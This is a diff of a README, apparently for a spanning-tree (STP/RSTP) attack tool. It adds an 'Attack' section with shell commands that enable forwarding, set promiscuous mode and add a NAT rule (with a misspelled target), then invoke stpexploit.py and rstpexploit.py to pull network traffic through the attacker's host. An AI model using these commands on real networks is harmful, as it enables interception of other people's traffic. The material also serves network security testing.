@@ -15,7 +15,7 @@ Depending on the power of your hardware. some host traffic will go through you, 
 
 ## 3. Attack
 
-### 3.1 Enable Forwarding (Route Management)
+### 3.1 Enable Forwarding
 
 ```
 sysctl -w net.ipv4.ip_forward
@@ -29,6 +29,22 @@ echo "1" > /proc/sys/net/netfilter/nf_conntrack_helper
 ```
 ifconfig ethX promisc
 ```
+### 3.4 NAT
+```
+iptables -t nat -A POSTROUTING -o ethX -j MASQUEADE
+```
+
+### 3.5 Start of injection.
+#### 3.5.1 STP
+```
+python3 stpexploit.py --interface ethX --mac XX:XX:XX:XX:XX:XX
+```
+#### 3.5.2 RSTP
+```
+python3 rstpexploit.py --interface ethX --mac XX:XX:XX:XX:XX:XX
+
+
+## 4. Help
 ```
 python3 stpexploit.py  --help     
 
